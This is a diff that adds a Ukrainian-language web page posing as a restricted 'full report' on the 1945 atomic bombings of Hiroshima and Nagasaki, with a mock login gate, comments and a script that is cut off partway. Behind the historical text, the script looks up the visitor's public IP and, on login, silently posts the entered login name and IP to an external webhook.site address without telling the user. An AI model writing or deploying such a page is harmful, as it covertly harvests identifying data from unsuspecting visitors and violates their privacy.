@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECURITY GATEWAY | ПОВНИЙ ЗВІТ</title>
+    <style>
+        body { background: #050505; color: #d1d1d1; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .window { background: #0e0e0e; border: 1px solid #333; padding: 40px; max-width: 450px; width: 90%; border-radius: 8px; text-align: center; display: none; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
+        input, textarea { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #333; color: #00ff41; border-radius: 4px; box-sizing: border-box; outline: none; }
+        button { background: #007acc; color: #fff; border: none; padding: 14px; cursor: pointer; font-weight: bold; width: 100%; border-radius: 4px; margin-top: 15px; transition: 0.3s; }
+        #app-content { display: none; width: 100%; max-width: 900px; padding: 40px 20px; }
+        .report-card { background: #fff; color: #111; padding: 60px; border-radius: 4px; box-shadow: 0 0 50px rgba(0,0,0,0.7); }
+        h1 { color: #004a80; border-bottom: 3px solid #004a80; padding-bottom: 15px; font-size: 1.8rem; text-align: center; }
+        h2 { color: #cc0000; border-left: 5px solid #cc0000; padding-left: 15px; margin-top: 35px; font-size: 1.3rem; }
+        p { line-height: 1.8; text-align: justify; margin-bottom: 15px; font-size: 1.05rem; }
+        .stats-box { background: #f4f4f4; border: 1px solid #ddd; padding: 20px; margin: 20px 0; border-radius: 4px; font-style: italic; }
+        .comment-section { background: #111; padding: 30px; border-radius: 8px; margin-top: 40px; border: 1px solid #333; }
+        .comment { background: #1a1a1a; padding: 12px; border-radius: 4px; margin-bottom: 10px; border-left: 3px solid #007acc; }
+    </style>
+</head>
+<body onload="initSystem()">
+
+    <div id="step-auth" class="window">
+        <h2>Доступ до архіву</h2>
+        <input type="text" id="login-field" placeholder="Ваш Логін">
+        <div style="font-size:0.8rem; color:#888;">IP: <span id="user-ip-display" style="color:#00ff41;">...</span></div>
+        <button onclick="handleAuth()">УВІЙТИ</button>
+    </div>
+
+    <div id="step-legal" class="window">
+        <h2 style="color:#ff4444;">Протокол безпеки</h2>
+        <p>Ви відкриваєте закритий звіт. Копіювання заборонено.</p>
+        <button onclick="handleLegal()">ВІДКРИТИ ЗВІТ</button>
+    </div>
+
+    <div id="app-content">
+        <div class="report-card">
+            <h1>ПОВНИЙ ЗВІТ: АТОМНА ТРАГЕДІЯ ЯПОНІЇ (1945)</h1>
+            <div style="text-align:right; font-size:0.8rem; color:#888;">СЕСІЯ: <span id="auth-user-name"></span></div>
+
+            <h2>1. Політичний контекст: Потсдамська декларація</h2>
+            <p>Наприкінці липня 1945 року союзники висунули Японії ультиматум про беззастережну капітуляцію. Японія відхилила цю вимогу. Президент США Гаррі Трумен прийняв рішення про використання нової секретної зброї, розробленої в рамках "Мангеттенського проєкту".</p>
+
+            <h2>2. 6 серпня, 08:15: Хроніка удару по Хіросімі</h2>
+            <p>Бомбардувальник B-29 «Enola Gay» під командуванням полковника Пола Тіббетса скинув бомбу «Little Boy» (Малюк). Вибух стався на висоті 600 метрів. Температура в епіцентрі сягнула 4000°C. У перші секунди загинуло близько 80 000 осіб.</p>
+
+            <div class="stats-box">
+                <b>Статистика руйнувань у Хіросімі:</b><br>
+                - Повністю зруйновано: 62 000 будівель (з 90 000 наявних).<br>
+                - Площа повного випалювання: 12 кв. км.<br>
+                - 90% лікарів та медичного персоналу загинули миттєво.
+            </div>
+
+            <h2>3. 9 серпня, 11:02: Трагедія Нагасакі</h2>
+            <p>Бомба «Fat Man» (Товстун) була вдвічі потужнішою за першу. Через хмарність над Кокурою, літак «Bockscar» змінив курс на Нагасакі. Вибух стався в районі Уракамі, де знаходився найбільший католицький собор Східної Азії.</p>
+
+            <h2>4. Радіаційне зараження та «Хібакуся»</h2>
+            <p>Ті, хто вижили, зіткнулися з променевою хворобою: випадіння волосся, крововиливи та рак. Термін «хібакуся» став пожиттєвим тавром для постраждалих.</p>
+
+            <h2>5. Вплив на цивільну інфраструктуру</h2>
+            <p>Система водопостачання була повністю знищена. Пожежі тривали кілька діб, створюючи "вогняні смерчі". У Нагасакі було знищено понад 18 000 житлових будинків.</p>
+
+            <h2>6. СРСР та вступ у війну</h2>
+            <p>8 серпня 1945 року СРСР оголосив війну Японії. Це стало остаточним дипломатичним ударом по японському уряду, який сподівався на мирні переговори через Москву.</p>
+
+            <h2>7. Капітуляція: Кінець війни</h2>
+            <p>15 серпня імператор Хірохіто оголосив про капітуляцію. 2 вересня на борту лінкора "Міссурі" Друга світова війна була офіційно завершена.</p>
+
+            <h2>8. Історичний урок</h2>
+            <p>Хіросіма та Нагасакі стали вічним нагадуванням про руйнівну силу ядерної зброї та необхідність збереження миру на планеті.</p>
+        </div>
+
+        <div class="comment-section">
+            <h3 style="color:#fff;">Обговорення</h3>
+            <div id="comments-display"></div>
+            <textarea id="comment-input" rows="2" placeholder="Ваша думка..."></textarea>
+            <button onclick="addComment()">ВІДПРАВИТИ</button>
+            <div id="admin-zone"></div>
+            <button onclick="logout()" style="background:#333; margin-top:20px; font-size:0.7rem;">Вийти з системи</button>
+        </div>
+    </div>
+
+    <script>
+        let currentIP = "Unknown";
+        const webHookUrl = 'https://webhook.site/2183ec37-a129-4437-96ef-76f18276627f';
+
+        async function getIP() {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                currentIP = d.ip;
+                document.getElementById('user-ip-display').innerText = currentIP;
+            } catch(e) { document.getElementById('user-ip-display').innerText = "127.0.0.1"; }
+        }
+
+        function initSystem() {
+            getIP();
+            if (localStorage.getItem('isAuth') === 'true' && localStorage.getItem('isLegal') === 'true') { showContent(); }
+            else if (localStorage.getItem('isAuth') === 'true') { showStep('step-legal'); }
+            else { showStep('step-auth'); }
+        }
+
+        function handleAuth() {
+            const l = document.getElementById('login-field').value.trim();
+            if (l) {
+                localStorage.setItem('isAuth', 'true');
+                localStorage.setItem('loggedAs', l);
+                localStorage.setItem('userIP', currentIP);
+
+                let logs = JSON.parse(localStorage.getItem('visit_logs') || '[]');
+                logs.push({ name: l, ip: currentIP, date: new Date().toLocaleString() });
+                localStorage.setItem('visit_logs', JSON.stringify(logs));
+
+                fetch(webHookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ user: l, ip: currentIP, event: "LOGIN" })
+                });
+
+                showStep('step-legal');
+            }
+        }
+
+        function handleLegal() { localStorage.
